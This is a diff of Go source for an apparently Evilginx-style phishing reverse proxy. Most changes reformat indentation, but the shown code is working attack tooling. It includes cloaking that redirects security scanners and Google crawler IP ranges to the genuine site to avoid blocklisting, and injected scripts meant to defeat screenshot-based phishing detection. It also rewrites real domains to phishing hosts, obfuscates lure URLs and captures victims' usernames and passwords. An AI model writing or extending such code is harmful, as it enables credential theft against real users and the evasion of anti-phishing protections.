-    resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
-    if resp != nil {
-        return req, resp
-    }
-    return req, nil
+	resp := goproxy.NewResponse(req, "text/html", http.StatusForbidden, "")
+	if resp != nil {
+		return req, resp
+	}
+	return req, nil
 }
 
 // scannerRedirect serves crawlers, safe-browsing probes, link previewers and other
@@ -1722,32 +1730,32 @@ func (p *HttpProxy) blockRequest(req *http.Request) (*http.Request, *http.Respon
 // site, which keeps the domain off the "Deceptive site ahead" blocklist, while the
 // phishing content is only ever shown to real visitors.
 func (p *HttpProxy) scannerRedirect(req *http.Request) (*http.Request, *http.Response) {
-    target := ""
-    if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
-        if pl.login.domain != "" {
-            target = "https://" + pl.login.domain + pl.login.path
-        }
-        if unauth, ok := p.cfg.GetSiteUnauthUrl(pl.Name); ok && unauth != "" {
-            target = unauth
-        }
-    }
-    if target == "" && len(p.cfg.general.UnauthUrl) > 0 {
-        target = p.cfg.general.UnauthUrl
-    }
-    if target == "" {
-        // no configured destination - fall back to the generic blocked response
-        return p.blockRequest(req)
-    }
+	target := ""
+	if pl := p.getPhishletByPhishHost(req.Host); pl != nil {
+		if pl.login.domain != "" {
+			target = "https://" + pl.login.domain + pl.login.path
+		}
+		if unauth, ok := p.cfg.GetSiteUnauthUrl(pl.Name); ok && unauth != "" {
+			target = unauth
+		}
+	}
+	if target == "" && len(p.cfg.general.UnauthUrl) > 0 {
+		target = p.cfg.general.UnauthUrl
+	}
+	if target == "" {
+		// no configured destination - fall back to the generic blocked response
+		return p.blockRequest(req)
+	}
 
-    log.Debug("scanner: redirecting %s to %s", req.Host, target)
-    resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
-    if resp != nil {
-        resp.Header.Set("Location", target)
-        resp.Header.Set("Cache-Control", "no-cache, no-store")
-        resp.Header.Set("X-UnAuth-Redirect", "1")
-        return req, resp
-    }
-    return p.blockRequest(req)
+	log.Debug("scanner: redirecting %s to %s", req.Host, target)
+	resp := goproxy.NewResponse(req, "text/html", http.StatusFound, "")
+	if resp != nil {
+		resp.Header.Set("Location", target)
+		resp.Header.Set("Cache-Control", "no-cache, no-store")
+		resp.Header.Set("X-UnAuth-Redirect", "1")
+		return req, resp
+	}
+	return p.blockRequest(req)
 }
 
 // scannerUAPatterns lists user-agent substrings associated with security scanners,
@@ -1837,7 +1845,7 @@ func isScannerUA(ua string) bool {
 // rendering headless run) still never evaluates the phish.
 var scannerIPNets = func() []*net.IPNet {
 	cidrs := []string{
-		"66.249.64.0/19",  // Googlebot / GSB primary
+		"66.249.64.0/19", // Googlebot / GSB primary
 		"66.249.80.0/20",
 		"66.249.90.0/24",
 		"64.233.160.0/19", // Google crawlers
@@ -1871,55 +1879,55 @@ func isScannerIP(ip string) bool {
 }
 
 func (p *HttpProxy) javascriptRedirect(req *http.Request, url string) (*http.Request, *http.Response) {
-    body := "<html><head><meta http-equiv=\"refresh\" content=\"0; url=" + url + "\"></head><body><script>window.location.replace(\"" + url + "\");</script></body></html>"
-    resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
-    if resp != nil {
-        return req, resp
-    }
-    return req, nil
+	body := "<html><head><meta http-equiv=\"refresh\" content=\"0; url=" + url + "\"></head><body><script>window.location.replace(\"" + url + "\");</script></body></html>"
+	resp := goproxy.NewResponse(req, "text/html", http.StatusOK, body)
+	if resp != nil {
+		return req, resp
+	}
+	return req, nil
 }
 
 func (p *HttpProxy) trackerImage(req *http.Request) (*http.Request, *http.Response) {
-    resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
-    if resp != nil {
-        return req, resp
-    }
-    return req, nil
+	resp := goproxy.NewResponse(req, "image/png", http.StatusOK, "")
+	if resp != nil {
+		return req, resp
+	}
+	return req, nil
 }
 
 func (p *HttpProxy) interceptRequest(req *http.Request, http_status int, body string, mime string) (*http.Request, *http.Response) {
-    if mime == "" {
-        mime = "text/plain"
-    }
-    resp := goproxy.NewResponse(req, mime, http_status, body)
-    if resp != nil {
-        origin := req.Header.Get("Origin")
-        if origin != "" {
-            resp.Header.Set("Access-Control-Allow-Origin", origin)
-        }
-        return req, resp
-    }
-    return req, nil
+	if mime == "" {
+		mime = "text/plain"
+	}
+	resp := goproxy.NewResponse(req, mime, http_status, body)
+	if resp != nil {
+		origin := req.Header.Get("Origin")
+		if origin != "" {
+			resp.Header.Set("Access-Control-Allow-Origin", origin)
+		}
+		return req, resp
+	}
+	return req, nil
 }
 
 func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url string) []byte {
-    js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-    m_nonce := js_nonce_re.FindStringSubmatch(string(body))
-    js_nonce := ""
-    if m_nonce != nil {
-        js_nonce = " nonce=\"" + m_nonce[1] + "\""
-    }
-    re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
-    var d_inject string
-    if script != "" {
-        d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
-    } else if src_url != "" {
-        d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
-    } else {
-        return body
-    }
-    ret := []byte(re.ReplaceAllString(string(body), d_inject))
-    return ret
+	js_nonce_re := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	m_nonce := js_nonce_re.FindStringSubmatch(string(body))
+	js_nonce := ""
+	if m_nonce != nil {
+		js_nonce = " nonce=\"" + m_nonce[1] + "\""
+	}
+	re := regexp.MustCompile(`(?i)(<\s*/body\s*>)`)
+	var d_inject string
+	if script != "" {
+		d_inject = "<script" + js_nonce + ">" + script + "</script>\n${1}"
+	} else if src_url != "" {
+		d_inject = "<script" + js_nonce + " type=\"application/javascript\" src=\"" + src_url + "\"></script>\n${1}"
+	} else {
+		return body
+	}
+	ret := []byte(re.ReplaceAllString(string(body), d_inject))
+	return ret
 }
 
 // injectRandomCSS adds a tiny inline script that applies imperceptible sub-pixel
@@ -1927,7 +1935,7 @@ func (p *HttpProxy) injectJavascriptIntoBody(body []byte, script string, src_url
 // screenshot-based phishing detection that compares pixel hashes without
 // altering any colors on the page.
 func (p *HttpProxy) injectRandomCSS(body []byte) []byte {
-    const randomCSSScript = `
+	const randomCSSScript = `
 <script nonce="{nonce}">
 (function(){
     try {
@@ -1940,649 +1948,684 @@ func (p *HttpProxy) injectRandomCSS(body []byte) []byte {
 })();
 </script>`
 
-    jsNonceRe := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
-    mNonce := jsNonceRe.FindStringSubmatch(string(body))
-    nonce := ""
-    if mNonce != nil {
-        nonce = mNonce[1]
-    }
-    script := strings.Replace(randomCSSScript, "{nonce}", nonce, 1)
+	jsNonceRe := regexp.MustCompile(`(?i)<script.*nonce=['"]([^'"]*)`)
+	mNonce := jsNonceRe.FindStringSubmatch(string(body))
+	nonce := ""
+	if mNonce != nil {
+		nonce = mNonce[1]
+	}
+	script := strings.Replace(randomCSSScript, "{nonce}", nonce, 1)
 
-    headRe := regexp.MustCompile(`(?i)(<\s*\/\s*head\s*>)`)
-    if headRe.MatchString(string(body)) {
-        body = []byte(headRe.ReplaceAllString(string(body), script+"\n$1"))
-    } else {
-        bodyRe := regexp.MustCompile(`(?i)(<\s*\/\s*body\s*>)`)
-        body = []byte(bodyRe.ReplaceAllString(string(body), script+"\n$1"))
-    }
-    return body
+	headRe := regexp.MustCompile(`(?i)(<\s*\/\s*head\s*>)`)
+	if headRe.MatchString(string(body)) {
+		body = []byte(headRe.ReplaceAllString(string(body), script+"\n$1"))
+	} else {
+		bodyRe := regexp.MustCompile(`(?i)(<\s*\/\s*body\s*>)`)
+		body = []byte(bodyRe.ReplaceAllString(string(body), script+"\n$1"))
+	}
+	return body
 }
 
-
 func (p *HttpProxy) isForwarderUrl(u *url.URL) bool {
-    vals := u.Query()
-    for _, v := range vals {
-        dec, err := base64.RawURLEncoding.DecodeString(v[0])
-        if err == nil && len(dec) == 5 {
-            var crc byte = 0
-            for _, b := range dec[1:] {
-                crc += b
-            }
-            if crc == dec[0] {
-                return true
-            }
-        }
-    }
-    return false
+	vals := u.Query()
+	for _, v := range vals {
+		dec, err := base64.RawURLEncoding.DecodeString(v[0])
+		if err == nil && len(dec) == 5 {
+			var crc byte = 0
+			for _, b := range dec[1:] {
+				crc += b
+			}
+			if crc == dec[0] {
+				return true
+			}
+		}
+	}
+	return false
 }
 
 func (p *HttpProxy) extractParams(session *Session, u *url.URL) bool {
-    var ret bool = false
-    vals := u.Query()
+	var ret bool = false
+	vals := u.Query()
 
-    var enc_key string
+	var enc_key string
 
-    for _, v := range vals {
-        if len(v[0]) > 8 {
-            enc_key = v[0][:8]
-            enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
-            if err == nil {
-                dec_params := make([]byte, len(enc_vals)-1)
+	for _, v := range vals {
+		if len(v[0]) > 8 {
+			enc_key = v[0][:8]
+			enc_vals, err := base64.RawURLEncoding.DecodeString(v[0][8:])
+			if err == nil {
+				dec_params := make([]byte, len(enc_vals)-1)
 
-                var crc byte = enc_vals[0]
-                c, _ := rc4.NewCipher([]byte(enc_key))
-                c.XORKeyStream(dec_params, enc_vals[1:])
+				var crc byte = enc_vals[0]
+				c, _ := rc4.NewCipher([]byte(enc_key))
+				c.XORKeyStream(dec_params, enc_vals[1:])
 
-                var crc_chk byte
-                for _, c := range dec_params {
-                    crc_chk += byte(c)
-                }
+				var crc_chk byte
+				for _, c := range dec_params {
+					crc_chk += byte(c)
+				}
 
-                if crc == crc_chk {
-                    params, err := url.ParseQuery(string(dec_params))
-                    if err == nil {
-                        for kk, vv := range params {
-                            log.Debug("param: %s='%s'", kk, vv[0])
+				if crc == crc_chk {
+					params, err := url.ParseQuery(string(dec_params))
+					if err == nil {
+						for kk, vv := range params {
+							log.Debug("param: %s='%s'", kk, vv[0])
 
-                            session.Params[kk] = vv[0]
-                        }
-                        ret = true
-                        break
-                    }
-                } else {
-                    log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
-                }
-            } else {
-                log.Debug("extractParams: %s", err)
-            }
-        }
-    }
-    return ret
+							session.Params[kk] = vv[0]
+						}
+						ret = true
+						break
+					}
+				} else {
+					log.Warning("lure parameter checksum doesn't match - the phishing url may be corrupted: %s", v[0])
+				}
+			} else {
+				log.Debug("extractParams: %s", err)
+			}
+		}
+	}
+	return ret
 }
 
 func (p *HttpProxy) replaceHtmlParams(body string, lure_url string, params *map[string]string) string {
-    t := make([]byte, 5)
-    rand.Read(t[1:])
-    var crc byte = 0
-    for _, b := range t[1:] {
-        crc += b
-    }
-    t[0] = crc
-    fwd_param := base64.RawURLEncoding.EncodeToString(t)
+	t := make([]byte, 5)
+	rand.Read(t[1:])
+	var crc byte = 0
+	for _, b := range t[1:] {
+		crc += b
+	}
+	t[0] = crc
+	fwd_param := base64.RawURLEncoding.EncodeToString(t)
 
-    lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
+	lure_url += "?" + strings.ToLower(GenRandomString(1)) + "=" + fwd_param
 
-    for k, v := range *params {
-        key := "{" + k + "}"
-        body = strings.Replace(body, key, html.EscapeString(v), -1)
-    }
-    var js_url string
-    n := 0
-    for n < len(lure_url) {
-        t := make([]byte, 1)
-        rand.Read(t)
-        rn := int(t[0])%3 + 1
+	for k, v := range *params {
+		key := "{" + k + "}"
+		body = strings.Replace(body, key, html.EscapeString(v), -1)
+	}
+	var js_url string
+	n := 0
+	for n < len(lure_url) {
+		t := make([]byte, 1)
+		rand.Read(t)
+		rn := int(t[0])%3 + 1
 
-        if rn+n > len(lure_url) {
-            rn = len(lure_url) - n
-        }
+		if rn+n > len(lure_url) {
+			rn = len(lure_url) - n
+		}
 
-        if n > 0 {
-            js_url += " + "
-        }
-        js_url += "'" + lure_url[n:n+rn] + "'"
+		if n > 0 {
+			js_url += " + "
+		}
+		js_url += "'" + lure_url[n:n+rn] + "'"
 
-        n += rn
-    }
+		n += rn
+	}
 
-    body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
-    body = strings.Replace(body, "{lure_url_js}", js_url, -1)
+	body = strings.Replace(body, "{lure_url_html}", lure_url, -1)
+	body = strings.Replace(body, "{lure_url_js}", js_url, -1)
 
-    return body
+	return body
 }
 
 func (p *HttpProxy) replaceHeaderWithOriginal(req *http.Request, header string) {
-    if _, ok := req.Header[header]; ok {
-        Hmap := req.Header.Values(header)
-        for i, H := range Hmap {
-            Hmap[i] = p.replaceStringWithOriginal(H)
-        }
-        req.Header[header] = Hmap
-    }
+	if _, ok := req.Header[header]; ok {
+		Hmap := req.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithOriginal(H)
+		}
+		req.Header[header] = Hmap
+	}
 }
 
 func (p *HttpProxy) replaceHeaderWithPhished(resp *http.Response, header string) {
-    if _, ok := resp.Header[header]; ok {
-        Hmap := resp.Header.Values(header)
-        for i, H := range Hmap {
-            Hmap[i] = p.replaceStringWithPhished(H)
-        }
-        resp.Header[header] = Hmap
-    }
+	if _, ok := resp.Header[header]; ok {
+		Hmap := resp.Header.Values(header)
+		for i, H := range Hmap {
+			Hmap[i] = p.replaceStringWithPhished(H)
+		}
+		resp.Header[header] = Hmap
+	}
 }
 
 func (p *HttpProxy) replaceStringWithOriginal(str string) string {
-    re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
+	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
 
-    str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
-        if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
-            return o_host
-        }
-        return s_host
-    })
-    return str
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithOriginal(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
 }
 
 func (p *HttpProxy) replaceStringWithPhished(str string) string {
-    re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
+	re_host := regexp.MustCompile(`\b([a-z0-9]([a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9]\b`)
 
-    str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
-        if o_host, ok := p.replaceHostWithPhished(s_host); ok {
-            return o_host
-        }
-        return s_host
-    })
-    return str
+	str = re_host.ReplaceAllStringFunc(str, func(s_host string) string {
+		if o_host, ok := p.replaceHostWithPhished(s_host); ok {
+			return o_host
+		}
+		return s_host
+	})
+	return str
 }
 
 func (p *HttpProxy) patchUrls(pl *Phishlet, body []byte, c_type int) []byte {
-    re_url := MATCH_URL_REGEXP
-    re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME
+	re_url := MATCH_URL_REGEXP
+	re_ns_url := MATCH_URL_REGEXP_WITHOUT_SCHEME
 
-    if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
-        var sub_map map[string]string = make(map[string]string)
-        var hosts []string
-        for _, ph := range pl.proxyHosts {
-            var h string
-            if c_type == CONVERT_TO_ORIGINAL_URLS {
-                h = combineHost(ph.phish_subdomain, phishDomain)
-                sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
-            } else {
-                h = combineHost(ph.orig_subdomain, ph.domain)
-                sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
-            }
-            hosts = append(hosts, h)
-        }
-        sort.Slice(hosts, func(i, j int) bool {
-            return len(hosts[i]) > len(hosts[j])
-        })
+	if phishDomain, ok := p.cfg.GetSiteDomain(pl.Name); ok {
+		var sub_map map[string]string = make(map[string]string)
+		var hosts []string
+		for _, ph := range pl.proxyHosts {
+			var h string
+			if c_type == CONVERT_TO_ORIGINAL_URLS {
+				h = combineHost(ph.phish_subdomain, phishDomain)
+				sub_map[h] = combineHost(ph.orig_subdomain, ph.domain)
+			} else {
+				h = combineHost(ph.orig_subdomain, ph.domain)
+				sub_map[h] = combineHost(ph.phish_subdomain, phishDomain)
+			}
+			hosts = append(hosts, h)
+		}
+		sort.Slice(hosts, func(i, j int) bool {
+			return len(hosts[i]) > len(hosts[j])
+		})
 
-        body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
-            u, err := url.Parse(s_url)
-            if err == nil {
-                for _, h := range hosts {
-                    if strings.ToLower(u.Host) == h {
-                        s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
-                        break
-                    }
-                }
-            }
-            return s_url
-        }))
-        body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
-            for _, h := range hosts {
-                if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
-                    s_url = strings.Replace(s_url, h, sub_map[h], 1)
-                    break
-                }
-            }
-            return s_url
-        }))
-    }
-    return body
+		body = []byte(re_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
+			u, err := url.Parse(s_url)
+			if err == nil {
+				for _, h := range hosts {
+					if strings.ToLower(u.Host) == h {
+						s_url = strings.Replace(s_url, u.Host, sub_map[h], 1)
+						break
+					}
+				}
+			}
+			return s_url
+		}))
+		body = []byte(re_ns_url.ReplaceAllStringFunc(string(body), func(s_url string) string {
+			for _, h := range hosts {
+				if strings.Contains(s_url, h) && !strings.Contains(s_url, sub_map[h]) {
+					s_url = strings.Replace(s_url, h, sub_map[h], 1)
+					break
+				}
+			}
+			return s_url
+		}))
+	}
+	return body
 }
 
 func (p *HttpProxy) TLSConfigFromCA() func(host string, ctx *goproxy.ProxyCtx) (*tls.Config, error) {
-    return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
-        parts := strings.SplitN(host, ":", 2)
-        hostname := parts[0]
-        port := 443
-        if len(parts) == 2 {
-            port, _ = strconv.Atoi(parts[1])
-        }
+	return func(host string, ctx *goproxy.ProxyCtx) (c *tls.Config, err error) {
+		parts := strings.SplitN(host, ":", 2)
+		hostname := parts[0]
+		port := 443
+		if len(parts) == 2 {
+			port, _ = strconv.Atoi(parts[1])
+		}
 
-        tls_cfg := &tls.Config{}
-        if !p.developer {
-            // WILDCARD CERT SUPPORT - use our custom GetCertificate if available
-            if p.crt_db.wildcardCert != nil && p.crt_db.wildcardDomain != "" {
-                tls_cfg.GetCertificate = p.crt_db.GetCertificate
-            } else {
-                tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
-            }
-            tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol}
+		tls_cfg := &tls.Config{}
+		if !p.developer {
+			// WILDCARD CERT SUPPORT - use our custom GetCertificate if available
+			if p.crt_db.wildcardCert != nil && p.crt_db.wildcardDomain != "" {
+				tls_cfg.GetCertificate = p.crt_db.GetCertificate
+			} else {
+				tls_cfg.GetCertificate = p.crt_db.magic.GetCertificate
+			}
+			tls_cfg.NextProtos = []string{"http/1.1", tlsalpn01.ACMETLS1Protocol}
 
-            return tls_cfg, nil
-        } else {
-            var ok bool
-            phish_host := ""
-            if !p.cfg.IsLureHostnameValid(hostname) {
-                phish_host, ok = p.replaceHostWithPhished(hostname)
-                if !ok {
-                    log.Debug("phishing hostname not found: %s", hostname)
-                    return nil, fmt.Errorf("phishing hostname not found")
-                }
-            }
+			return tls_cfg, nil
+		} else {
+			var ok bool
+			phish_host := ""
+			if !p.cfg.IsLureHostnameValid(hostname) {
+				phish_host, ok = p.replaceHostWithPhished(hostname)
+				if !ok {
+					log.Debug("phishing hostname not found: %s", hostname)
+					return nil, fmt.Errorf("phishing hostname not found")
+				}
+			}
 
-            cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
-            if err != nil {
-                log.Error("http_proxy: %s", err)
-                return nil, err
-            }
-            return &tls.Config{
-                InsecureSkipVerify: true,
-                Certificates:       []tls.Certificate{*cert},
-            }, nil
-        }
-    }
+			cert, err := p.crt_db.getSelfSignedCertificate(hostname, phish_host, port)
+			if err != nil {
+				log.Error("http_proxy: %s", err)
+				return nil, err
+			}
+			return &tls.Config{
+				InsecureSkipVerify: true,
+				Certificates:       []tls.Certificate{*cert},
+			}, nil
+		}
+	}
 }
 
 func (p *HttpProxy) setSessionCmsgid(sid string, cmsgid string) {
-    if sid == "" {
-        return
-    }
-    s, ok := p.sessions[sid]
-    if ok {
-        s.SetCmsgid(cmsgid)
-    }
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetCmsgid(cmsgid)
+	}
 }
 
 func (p *HttpProxy) setSessionTmsgid(sid string, tmsgid string) {
-    if sid == "" {
-        return
-    }
-    s, ok := p.sessions[sid]
-    if ok {
-        s.SetTmsgid(tmsgid)
-    }
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetTmsgid(tmsgid)
+	}
 }
 
 func (p *HttpProxy) setSessionUsername(sid string, username string) {
-    if sid == "" {
-        return
-    }
-    s, ok := p.sessions[sid]
-    if ok {
-        s.SetUsername(username)
-        log.Debug("username added")
-    }
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetUsername(username)
+		log.Debug("username added")
+	}
 }
 
 func (p *HttpProxy) setSessionPassword(sid string, password string) {
-    if sid == "" {
-        return
-    }
-    s, ok := p.sessions[sid]
-    if ok {
-        s.SetPassword(password)
-        log.Debug("password added")
-    }
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetPassword(password)
+		log.Debug("password added")
+	}
 }
 
 func (p *HttpProxy) setSessionCustom(sid string, name string, value string) {
-    if sid == "" {
-        return
-    }
-    s, ok := p.sessions[sid]
-    if ok {
-        s.SetCustom(name, value)
-    }
+	if sid == "" {
+		return
+	}
+	s, ok := p.sessions[sid]
+	if ok {
+		s.SetCustom(name, value)
+	}
 }
 
 func (p *HttpProxy) httpsWorker() {
-    var err error
+	var err error
 
-    p.sniListener, err = net.Listen("tcp", p.Server.Addr)
-    if err != nil {
-        log.Fatal("%s", err)
-        return
-    }
+	p.sniListener, err = net.Listen("tcp", p.Server.Addr)
+	if err != nil {
+		log.Fatal("%s", err)
+		return
+	}
 
-    p.isRunning = true
-    for p.isRunning {
-        c, err := p.sniListener.Accept()
-        if err != nil {
-            log.Error("Error accepting connection: %s", err)
-            continue
-        }
+	p.isRunning = true
+	for p.isRunning {
+		c, err := p.sniListener.Accept()
+		if err != nil {
+			log.Error("Error accepting connection: %s", err)
+			continue
+		}
 
-        go func(c net.Conn) {
-            now := time.Now()
-            c.SetReadDeadline(now.Add(httpReadTimeout))
-            c.SetWriteDeadline(now.Add(httpWriteTimeout))
+		go func(c net.Conn) {
+			now := time.Now()
+			c.SetReadDeadline(now.Add(httpReadTimeout))
+			c.SetWriteDeadline(now.Add(httpWriteTimeout))
 
-            tlsConn, err := vhost.TLS(c)
-            if err != nil {
-                return
-            }
+			tlsConn, err := vhost.TLS(c)
+			if err != nil {
+				return
+			}
 
-            hostname := tlsConn.Host()
-            if hostname == "" {
-                return
-            }
+			hostname := tlsConn.Host()
+			if hostname == "" {
+				return
+			}
 
-            // Serve dashboard and redirect pages directly (before phishlet routing).
-            // These subdomains are not in IsActiveHostname, so they must be caught here.
-            lowerHost := strings.ToLower(hostname)
-            if p.dashboardHandler != nil || p.redirectsDir != "" {
-                isDash := p.dashboardHandler != nil && strings.ToLower(p.cfg.GetDashboardHost()) == lowerHost
-                var rp *RedirectPage
-                if !isDash && p.redirectsDir != "" {
-                    rp = p.cfg.GetRedirectPageByHost(lowerHost)
-                }
-                if isDash || rp != nil {
-                    tlsCfg := &tls.Config{GetCertificate: p.crt_db.GetCertificate}
-                    realTLS := tls.Server(tlsConn, tlsCfg)
-                    if err := realTLS.Handshake(); err != nil {
-                        return
-                    }
-                    var handler http.Handler
-                    if isDash {
-                        handler = p.dashboardHandler
-                    } else {
-                        rpCopy := rp
-                        handler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
-                            ServeRedirectPage(w, req, rpCopy, p.redirectsDir, p.cfg.GetTurnstileSiteKey())
-                        })
-                    }
-                    l := newSingleConnListener(realTLS)
-                    srv := &http.Server{
-                        Handler: handler,
-                        ConnState: func(_ net.Conn, state http.ConnState) {
-                            if state == http.StateClosed || state == http.StateHijacked {
-                                l.Close()
-                            }
-                        },
-                    }
-                    srv.Serve(l)
-                    return
-                }
-            }
+			// Serve dashboard and redirect pages directly (before phishlet routing).
+			// These subdomains are not in IsActiveHostname, so they must be caught here.
+			lowerHost := strings.ToLower(hostname)
+			if p.dashboardHandler != nil || p.redirectsDir != "" {
+				isDash := p.dashboardHandler != nil && strings.ToLower(p.cfg.GetDashboardHost()) == lowerHost
+				var rp *RedirectPage
+				if !isDash && p.redirectsDir != "" {
+					rp = p.cfg.GetRedirectPageByHost(lowerHost)
+				}
+				if isDash || rp != nil {
+					tlsCfg := &tls.Config{GetCertificate: p.crt_db.GetCertificate}
+					realTLS := tls.Server(tlsConn, tlsCfg)
+					if err := realTLS.Handshake(); err != nil {
+						return
+					}
+					var handler http.Handler
+					if isDash {
+						handler = p.dashboardHandler
+					} else {
+						rpCopy := rp
+						handler = http.HandlerFunc(func(w http.ResponseWriter, req *http.Request) {
+							ServeRedirectPage(w, req, rpCopy, p.redirectsDir, p.cfg.GetTurnstileSiteKey())
+						})
+					}
+					l := newSingleConnListener(realTLS)
+					srv := &http.Server{
+						Handler: handler,
+						ConnState: func(_ net.Conn, state http.ConnState) {
+							if state == http.StateClosed || state == http.StateHijacked {
+								l.Close()
+							}
+						},
+					}
+					srv.Serve(l)
+					return
+				}
+			}
 
-            if !p.cfg.IsActiveHostname(hostname) {
-                log.Debug("hostname unsupported: %s", hostname)
-                return
-            }
+			if !p.cfg.IsActiveHostname(hostname) {
+				log.Debug("hostname unsupported: %s", hostname)
+				return
+			}
 
-            if replaced, ok := p.replaceHostWithOriginal(hostname); ok {
-                hostname = replaced
-            } else if lurePl := p.getPhishletByPhishHost(hostname); lurePl != nil {
-                // Custom lure subdomain: route upstream via the phishlet's landing host
-                // so goproxy connects to the real server, not back to itself.
-                if landingHost := lurePl.GetLandingPhishHost(); landingHost != "" {
-                    if orig, ok2 := p.replaceHostWithOriginal(landingHost); ok2 {
-                        hostname = orig
-                    }
-                }
-            }
+			if replaced, ok := p.replaceHostWithOriginal(hostname); ok {
+				hostname = replaced
+			} else if lurePl := p.getPhishletByPhishHost(hostname); lurePl != nil {
+				// Custom lure subdomain: route upstream via the phishlet's landing host
+				// so goproxy connects to the real server, not back to itself.
+				if landingHost := lurePl.GetLandingPhishHost(); landingHost != "" {
+					if orig, ok2 := p.replaceHostWithOriginal(landingHost); ok2 {
+						hostname = orig
+					}
+				}
+			}
 
-            req := &http.Request{
-                Method: "CONNECT",
-                URL: &url.URL{
-                    Opaque: hostname,
-                    Host:   net.JoinHostPort(hostname, "443"),
-                },
-                Host:       hostname,
-                Header:     make(http.Header),
-                RemoteAddr: c.RemoteAddr().String(),
-            }
-            resp := dumbResponseWriter{tlsConn}
-            p.Proxy.ServeHTTP(resp, req)
-        }(c)
-    }
+			req := &http.Request{
+				Method: "CONNECT",
+				URL: &url.URL{
+					Opaque: hostname,
+					Host:   net.JoinHostPort(hostname, "443"),
+				},
+				Host:       hostname,
+				Header:     make(http.Header),
+				RemoteAddr: c.RemoteAddr().String(),
+			}
+			resp := dumbResponseWriter{tlsConn}
+			p.Proxy.ServeHTTP(resp, req)
+		}(c)
+	}
 }
 
 func (p *HttpProxy) getPhishletByOrigHost(hostname string) *Phishlet {
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-                    return pl
-                }
-            }
-        }
-    }
-    return nil
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+					return pl
+				}
+			}
+		}
+	}
+	return nil
 }
 
 func (p *HttpProxy) getPhishletByPhishHost(hostname string) *Phishlet {
-    for site, pl := range p.cfg.phishlets {
-        if p.cfg.IsSiteEnabled(site) {
-            phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-            if !ok {
-                continue
-            }
-            for _, ph := range pl.proxyHosts {
-                if hostname == combineHost(ph.phish_subdomain, phishDomain) {
-                    return pl
-                }
-            }
-        }
-    }
+	for site, pl := range p.cfg.phishlets {
+		if p.cfg.IsSiteEnabled(site) {
+			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+			if !ok {
+				continue
+			}
+			for _, ph := range pl.proxyHosts {
+				if hostname == combineHost(ph.phish_subdomain, phishDomain) {
+					return pl
+				}
+			}
+		}
+	}
 
-    for _, l := range p.cfg.lures {
-        if l.Hostname == hostname {
-            if p.cfg.IsSiteEnabled(l.Phishlet) {
-                pl, err := p.cfg.GetPhishlet(l.Phishlet)
-                if err == nil {
-                    return pl
-                }
-            }
-        }
-    }
+	for _, l := range p.cfg.lures {
+		if l.Hostname == hostname {
+			if p.cfg.IsSiteEnabled(l.Phishlet) {
+				pl, err := p.cfg.GetPhishlet(l.Phishlet)
+				if err == nil {
+					return pl
+				}
+			}
+		}
+	}
 
-    return nil
+	return nil
 }
 
 func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
-    if hostname == "" {
-        return hostname, false
-    }
-    prefix := ""
